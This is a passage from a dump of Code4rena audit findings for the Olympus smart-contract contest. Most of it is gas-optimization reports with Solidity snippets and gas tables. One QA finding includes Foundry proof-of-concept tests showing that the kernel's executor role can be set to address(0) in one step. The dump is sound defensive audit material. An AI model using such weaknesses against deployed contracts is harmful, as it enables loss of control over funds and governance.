\u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524  \u2502 Function Name                                \u2506 min             \u2506 avg   \u2506 median \u2506 max   \u2506 # calls \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524  \u2502 active                                       \u2506 323             \u2506 989   \u2506 323    \u2506 2323  \u2506 3       \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 beat                                         \u2506 5429            \u2506 29228 \u2506 18552  \u2506 61386 \u2506 8       \u2502 +\u2502 beat                                         \u2506 5429            \u2506 28154 \u2506 17478  \u2506 59238 \u2506 8       \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524  \u2502 configureDependencies                        \u2506 24123           \u2506 24123 \u2506 24123  \u2506 24123 \u2506 11      \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 @@ -397,7 +397,7 @@  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524  \u2502 isActive                                    \u2506 439             \u2506 439    \u2506 439    \u2506 439    \u2506 63      \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 operate                                     \u2506 387             \u2506 122263 \u2506 37958  \u2506 640609 \u2506 104     \u2502 +\u2502 operate                                     \u2506 387             \u2506 121697 \u2506 37958  \u2506 636406 \u2506 104     \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524  \u2502 regenerate                                  \u2506 3772            \u2506 17622  \u2506 21791  \u2506 29292  \u2506 6       \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 @@ -577,7 +577,7 @@  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524  \u2502 getFee                                                                  \u2506 872             \u2506 3538   \u2506 4872   \u2506 4872   \u2506 6       \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 purchase                                                                \u2506 228899          \u2506 239488 \u2506 239488 \u2506 250077 \u2506 2       \u2502 +\u2502 purchase                                                                \u2506 228739          \u2506 239261 \u2506 239261 \u2506 249783 \u2506 2       \u2502  \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f  \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e  \u2502 src/test/mocks/KernelTestMocks.sol:MockModule contract \u2506                 \u2506       \u2506        \u2506       \u2506         \u2502 ```   ### [G&#x2011;04]  State variables can be packed into fewer storage slots If variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (**20000 gas**). Reads of the variables can also be cheaper  *There is 1 instance of this issue:* ```solidity File: src/policies/Heart.sol  /// @audit Variable ordering with 5 slots instead of the current 6: ///           uint256(32):lastBeat, uint256(32):reward, user-defined(20):rewardToken, bool(1):active, address(20):PRICE, address(20):_operator 33:       bool public active;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d7"}, {"title": "Single step ownership model for critical roles", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/153", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/fullyallocated/Default/blob/master/src/Kernel.sol#L192   # Vulnerability details  ### Impact  The `executor` and `admin` roles are important administrative roles that can be set to any arbitrary address that the organisation does not control e.g. `address(0).`   This impact is that the system can no longer be  administered as the `executor` role is the key administrator role for adding, upgrading and removing Kernels, Modules, Policies, Executors and Admins.  Both the `admin` and `executor` roles can be set to an arbitrary address in a single step however it is worse if the `executor` is changed to something like  `address(0)` as no other role can change it back. The `executor` can change the `admin` role but the `admin` cannot change the executor.  Due to the impact I believe this to be of Medium to High severity.  ### Proof of Concept  Below is a test demonstrating that the `executor` role can be set to `address(0)` by the current `executor`;  ```solidity function testCorrectness_ChangeExecutorToAddressZero() public {   // Demonstrate how the executor role can be changed by setting   // it to the multisig address.   vm.startPrank(deployer);   kernel.executeAction(Actions.ChangeExecutor, address(multisig));   vm.stopPrank();   assertEq(kernel.executor(), address(multisig));    // As the current executor set the new executor to be address(0).   vm.prank(multisig);   kernel.executeAction(Actions.ChangeExecutor, address(0));   vm.stopPrank();   assertEq(kernel.executor(), address(0)); } ```  The `admin` role cannot modify the `executor` so if it is set to a arbitrary address that Olympus does not control it cannot be reset;  ```solidity function testCorrectness_AdminCannotChangeExecutor() public {   // Demonstrate how the admin role can be changed by setting   // it to the multisig address.   vm.startPrank(deployer);   kernel.executeAction(Actions.ChangeAdmin, address(multisig));   vm.stopPrank();   assertEq(kernel.admin(), address(multisig));    // As the current admin try and change the executor.   vm.prank(multisig);   err = abi.encodeWithSignature(\"Kernel_OnlyExecutor(address)\", multisig);   vm.expectRevert(err);   kernel.executeAction(Actions.ChangeExecutor, address(0));   vm.stopPrank(); } ```  ### Tools Used  Vim  ### Recommended Remediation Steps  The Kernel should implement a two step ownership change for crucial roles such as the `executor` and `admin`. In the first step the ownership change is \u2018proposed\u2019 and the address of the new owner (for `executor` or `admin`) is stored in a state variable. As part of the proposal `address(0)` can be checked and a revert take place. In the second step the new owner would then need to \u2018accept\u2019 the ownership change by executing a function on the smart contract.   Furthermore I feel that the `executor` should not not be able to change the `admin` role via `Actions.ChangeAdmin` on [L212](https://github.com/fullyallocated/Default/blob/master/src/Kernel.sol#L212) and the `admin` should be able to set a new `executor`. This would ensure there is proper separation of duties between the `admin` and the `executor` roles."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/152", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "1. Use `external` modifier instead of `public` to save deployment gas. https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L37 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L33 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L37 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L75 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L145 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L151 2. Check revert things on top of the function. https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L48 "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/147", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "## USE CALLDATA INSTEAD OF MEMORY  When a function with a memory array is called externally, the abi.decode() step has to use a for-loop to copy each index of the calldata to the memoryindex. Each iteration of this for-loop costs at least 60 gas (i.e. 60 * <mem_array>.length). Using calldata directly, obliviates the need for such a loop in the contract code and runtime execution. Structs have the same overhead as an array of length one  When arguments are read-only on external functions, the data location should be calldata  7 instances:  -Kernel.sol line 393 -PRICE.sol line 205 -BondCallback.sol line 152 -Governance.sol line 162 -Operator lines 96, 97 -TreasuryCustodian..sol line 53  ## <ARRAY>.LENGTH SHOULD NOT BE LOOKED UP IN EVERY LOOP OF A FOR-LOOP  Reading array length at each iteration of the loop consumes more gas than necessary. In the best case scenario (length read on a memory variable), caching the array length in the stack saves around 3 gas per iteration. In the worst case scenario (external calls at each iteration), the amount of gas wasted can be massive.  Consider storing the array\u2019s length in a variable before the for-loop, and use this new variable instead  1 instance: Governance.sol lines 278  ## ++i COSTS LESS GAS THAN i++, ESPECIALLY WHEN IT\u2019S USED IN FOR-LOOPS (--I/I-- TOO)  This saves 6 gas per instace  2 instances: KernelUtils.sol lines 49, 64  ## IT COSTS MORE GAS TO INITIALIZE VARIABLES WITH THEIR DEFAULT VALUE THAN LETTING THE DEFAULT VALUE BE APPLIED  If a variable is not set/initialized, it is assumed to have the default value (0 for uint, false for bool, address(0) for address\u2026). Explicitly initializing it with its default value is an anti-pattern and wastes gas.  As an example:  ` for (uint256 i = 0; i < numIterations; ++i) {  ` should be replaced with:  ` for (uint256 i; i < numIterations; ++i) { `  3 instances: Kernel.sol line 397 KernelUtils.sol lines 43, 58   ## USING > 0 COSTS MORE GAS THAN != 0 WHEN USED ON A UINT  This saves 6 gas per instance.  1 instance: Governance.sol line 247  ## USING >= 10  COSTS MORE GAS THAN > 9  1 instance Operator.sol line 486  ## SHORTCIRCUITING OPTIMIZATION  __Kernel.sol line 283:__  The order of the functions inside the if statement in line 283:  ` if (address(oldModule) == address(0) || oldModule == newModule_) `  can be switched to: ` if (oldModule == newModule_ || address(oldModule) == address(0)) ` for optimal gas usage because oldModule == newModule_ is more probable to be TRUE hence second one won\u2019t be executed and hence save you gas.  **Operator.sol line 739:**  Checking sideActive in the second part of the if clause is not necessary because if that second part is executed sideActive can only be true: `  if (             !sideActive ||             (sideActive &&                 auctioneer.isLive(market) &&                 RANGE.capacity(high_) < auctioneer.currentCapacity(market))         ) ` can be switched to: `  if (             !sideActive ||             ( auctioneer.isLive(market) &&                 RANGE.capacity(high_) < auctioneer.currentCapacity(market))         ) `  for optimal gas usage because sideActive is already TRUE hence no need to check it and hence save you gas.   ## USING PRIVATE RATHER THAN PUBLIC FOR CONSTANTS, SAVES GAS  If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table  7 instances: -Governance.sol 121, 124, 127, 130, 133, 137  -Operator.sol 89    "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/145", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "### [G-01] ++i costs less gas compared to i++  ++i costs **about 5 gas less per iteration** compared to i++ for unsigned integer.  Same thing for decremental with -- operator. This statement is true even with the optimizer enabled. Summarized my results where i is used in a loop, is unsigned integer, and you safely can be changed to ++i without changing any behavior,  ** Most places are using best practice (++i and unchecked where possible) - good job Yet I've found 5 locations that can do better:  ``` src/policies/Operator.sol:   487              price_ = price_ / 10;   488:             decimals++;   489          }    669                  _status.low.observations[regen.nextObservation] = true;   670:                 _status.low.count++;   671              }    674                  _status.low.observations[regen.nextObservation] = false;   675:                 _status.low.count--;   676              }    685                  _status.high.observations[regen.nextObservation] = true;   686:                 _status.high.count++;   687              }      690                  _status.high.observations[regen.nextObservation] = false;   691:                 _status.high.count--;   692              }    ```  ---------------------------------------------------------------------------   ### [G-02] An arrays length should be cached to save gas in for-loops  An array\u2019s length should be cached to save gas in for-loops Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset). Caching the array length in the stack saves around **3 gas per iteration**.  I've found only 1 location to improve:  ``` src/policies/Governance.sol:   277     278:         for (uint256 step; step < instructions.length; ) {   279              kernel.executeAction(instructions[step].action, instructions[step].target);    ```  ---------------------------------------------------------------------------   ### [G-03] Using default values is cheaper than assignment  If a variable is not set/initialized, it is assumed to have the default value 0 for uint, and false for boolean. Explicitly initializing it with its default value is an anti-pattern and wastes gas. For example: ```uint8 i = 0;``` should be replaced with ```uint8 i;```  I've found 3 locations in 2 files:  ``` src/Kernel.sol:   396          uint256 reqLength = requests_.length;   397:         for (uint256 i = 0; i < reqLength; ) {   398              Permissions memory request = requests_[i];  src/utils/KernelUtils.sol:   42     43:     for (uint256 i = 0; i < 5; ) {   44          bytes1 char = unwrapped[i];    57     58:     for (uint256 i = 0; i < 32; ) {   59          bytes1 char = unwrapped[i];   ```  ---------------------------------------------------------------------------   ### [G-04] != 0 is cheaper than > 0  != 0 costs less gas compared to > 0 for unsigned integers even when optimizer enabled All of the following findings are uint (E&OE) so >0 and != have exactly the same effect. ** saves 6 gas ** each  I've found only 1 place to improve - good job on all other uses of !=  ``` src/policies/Governance.sol:   246     247:         if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {   248              revert UserAlreadyVoted(); ```  ---------------------------------------------------------------------------   ### [G-05] Upgrade pragma to 0.8.16 to save gas  Across the whole solution, the declared pragma is 0.8.15 (good!) Upgrading to 0.8.16 may result in lower gas uses.  Source: ``` According to the release note of 0.8.16: https://blog.soliditylang.org/2022/08/08/solidity-0.8.16-release-announcement/ \".. there are several minor bug fixes and improvements like more gas-efficient overflow checks for addition and subtraction.\" ```   ---------------------------------------------------------------------------   * Custom errors save gas - already using custom errors all over the project - good job!! * Using immutables (for vars that are only in constructor) seems find throughout the project "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/135", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "- [Gas](#gas)     - [**1. Don't use the length of an array for loops condition**](#1-dont-use-the-length-of-an-array-for-loops-condition)     - [**2. Reduce boolean comparison**](#2-reduce-boolean-comparison)         - [Total gas saved: **18 * 2 = 36**](#total-gas-saved-18--2--36)     - [**3. Avoid compound assignment operator in state variables**](#3-avoid-compound-assignment-operator-in-state-variables)         - [Total gas saved: **13 * 18 = 234**](#total-gas-saved-13--18--234)     - [**4. Shift right instead of dividing by 2**](#4-shift-right-instead-of-dividing-by-2)         - [Total gas saved: **172 * 2 = 344**](#total-gas-saved-172--2--344)     - [**5. ++i costs less gas compared to i++ or i += 1**](#5-i-costs-less-gas-compared-to-i-or-i--1)     - [**6. There's no need to set default values for variables**](#6-theres-no-need-to-set-default-values-for-variables)         - [Total gas saved: **8 * 2 = 16**](#total-gas-saved-8--2--16)     - [**7. Change bool to uint256 can save gas**](#7-change-bool-to-uint256-can-save-gas)     - [**8. Optimize KEYCODE**](#8-optimize-keycode)         - [Optimize MINTR.KEYCODE](#optimize-mintrkeycode)         - [Optimize INSTR.KEYCODE](#optimize-instrkeycode)         - [Optimize VOTES.KEYCODE](#optimize-voteskeycode)         - [Optimize PRICE.KEYCODE](#optimize-pricekeycode)         - [Optimize TRSRY.KEYCODE](#optimize-trsrykeycode)         - [Optimize RANGE.KEYCODE](#optimize-rangekeycode)     - [**9. Optimize  requestPermissions**](#9-optimize--requestpermissions)         - [Optimize  OlympusPriceConfig.requestPermissions](#optimize--olympuspriceconfigrequestpermissions)         - [Optimize VoterRegistration.requestPermissions](#optimize-voterregistrationrequestpermissions)     - [**10. Optimize configureDependencies using immutable**](#10-optimize-configuredependencies-using-immutable)         - [Optimize OlympusPriceConfig.configureDependencies](#optimize-olympuspriceconfigconfiguredependencies)         - [Optimize TreasuryCustodian.configureDependencies](#optimize-treasurycustodianconfiguredependencies)         - [Optimize BondCallback.configureDependencies](#optimize-bondcallbackconfiguredependencies)         - [Optimize Governance.configureDependencies](#optimize-governanceconfiguredependencies)         - [Optimize Operator.configureDependencies](#optimize-operatorconfiguredependencies)     - [**11. Avoid storage use**](#11-avoid-storage-use)     - [**12. Use inline instead of a method**](#12-use-inline-instead-of-a-method)     - [**13. Gas saving using immutable**](#13-gas-saving-using-immutable)     - [**14. Avoid public constants**](#14-avoid-public-constants)     - [**15. Reduce math operations**](#15-reduce-math-operations)         - [Optimize Governance.submitProposal](#optimize-governancesubmitproposal)         - [Optimize Governance.activateProposal](#optimize-governanceactivateproposal)         - [Optimize Governance.executeProposal](#optimize-governanceexecuteproposal)         - [Optimize Operator._activate](#optimize-operator_activate)     - [**16. Use calldata instead of memory**](#16-use-calldata-instead-of-memory)     - [**17. Optimze instructions order**](#17-optimze-instructions-order)         - [Optimize Governance.endorseProposal](#optimize-governanceendorseproposal)         - [Optimize Governance.endorseProposal](#optimize-governanceendorseproposal)     - [**18. Optimze Governance storage**](#18-optimze-governance-storage)     - [**19. delete optimization**](#19-delete-optimization)         - [Total gas saved: **5 * 1 = 5**](#total-gas-saved-5--1--5)     - [**20. Optimize Operator.bondPurchase**](#20-optimize-operatorbondpurchase)     - [**21. Optimize Operator refactoring some methods**](#21-optimize-operator-refactoring-some-methods)     - [**22. Optimize Operator.setRegenParams and Operator._regenerate**](#22-optimize-operatorsetregenparams-and-operator_regenerate)  # Gas  ## **1. Don't use the length of an array for loops condition**  It's cheaper to store the length of the array inside a local variable and iterate over it.  **Affected source code:**  - [Governance.sol:278](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L278)  ## **2. Reduce boolean comparison**  It's compared a boolean value using `== true` or `== false`, instead of using the boolean value. `NOT` opcode, it's cheaper to use `EQUAL` or `NOTEQUAL` when the value it's false, or just the value without `== true` when it's true, because it will use less opcodes inside the VM.  **Proof of concept (*without optimizations*):**  ```javascript pragma solidity 0.8.16;  contract TesterA { function testEqual(bool a) public view returns (bool) { return a == true; } }  contract TesterB { function testNot(bool a) public view returns (bool) { return a; } } ```  Gas saving executing: **18 per entry for == true**  ``` TesterA.testEqual:   21814 TesterB.testNot:     21796    ```  ```javascript pragma solidity 0.8.16;  contract TesterA { function testEqual(bool a) public view returns (bool) { return a == false; } }  contract TesterB { function testNot(bool a) public view returns (bool) { return !a; } } ```  Gas saving executing: **15 per entry for == false**  ``` TesterA.testEqual:   21814  TesterB.testNot:     21799 ```  **Affected source code:**  Use the value instead of `== true`:  - [Governance.sol:223](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L223) - [Governance.sol:306](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L306)  ### Total gas saved: **18 * 2 = 36**  ## **3. Avoid compound assignment operator in state variables**  Using compound assignment operator for state variables (like `State += X` or `State -= X` ...) it's more expensive than use operator assignment (like `State = State + X` or `State = State - X` ...).  **Proof of concept (*without optimizations*):**  ```javascript pragma solidity 0.8.15;  contract TesterA { uint private _a; function testShort() public {  _a += 1; } }  contract TesterB { uint private _a; function testLong() public {  _a = _a + 1; } } ```  Gas saving executing: **13 per entry**  ``` TesterA.testShort: 43507 TesterB.testLong:  43494 ```  **Affected source code:**  - [PRICE.sol:136](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L136) - [PRICE.sol:138](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L138) - [PRICE.sol:222](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L222) - [TRSRY.sol:96](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L96) - [TRSRY.sol:97](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L97) - [TRSRY.sol:115](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L115) - [TRSRY.sol:116](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L116) - [TRSRY.sol:131](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L131) - [TRSRY.sol:132](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L132) - [VOTES.sol:56](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L56) - 